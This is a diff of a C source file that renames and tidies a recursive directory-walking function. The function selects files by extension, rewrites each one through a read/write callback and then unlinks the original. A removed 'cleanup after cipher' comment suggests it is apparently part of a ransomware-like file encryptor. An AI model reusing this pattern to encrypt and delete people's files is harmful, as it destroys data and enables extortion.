@@ -1,11 +1,10 @@
 #include "fournights.h"
 /**
-  * recurse_ls - Searches through a target directory for all files,
+  * traverse_dir - Searches through a target directory for all files,
  (* and builds a linked list of those files
-  * @rootpath: target directory
-  * @head: head of the linked list
-  * @list_extensions: ptr to a linked list of file extensions
-  * Return: Returns a pointer to the head of the linked list
+  * @dirname: target directory
+  * @file_filter: main struct with temporary bufs
+  * Return: NULL on error or the struct as a void * NEEDED?
  **/
 void *traverse_dir(char *dirname, file_filter_t *file_filter)
 {
@@ -34,22 +33,20 @@ void *traverse_dir(char *dirname, file_filter_t *file_filter)
 			my_strncat(filepath, "/", len_rootpath + len_filename, 1);
 			traverse_dir(filepath, file_filter);
 		}
-		else if ((binary_search_string(read->d_name, len_filename, file_filter) != 0) && S_ISREG(file_info.st_mode) != 0)
+		else if ((search_string(read->d_name, file_filter->file_extensions) != 0) &&
+				S_ISREG(file_info.st_mode) != 0)
 		{
 			file_filter->tmp_bufs->file_info = file_info;
-			do
-			{
+			do {
 				my_strncat(file_filter->tmp_bufs->filepath, filepath, 0, my_strlen(filepath));
 				read_file(file_filter->tmp_bufs->filepath, file_filter, write_file);
-			}
-			while(file_filter->tmp_bufs->file_offset < file_filter->tmp_bufs->file_info.st_size);
-
+			} while (file_filter->tmp_bufs->file_offset < file_filter->tmp_bufs->file_info.st_size);
 			file_filter->tmp_bufs->file_offset = 0;
 			file_filter->tmp_bufs->bytes_read = 0;
+			chmod(file_filter->tmp_bufs->filepath, file_info.st_mode);
 			unlink(filepath);
 		}
 	}
-	/* cleanup after cipher */
 	free(filepath);
 	closedir(dir);
 	return (file_filter);
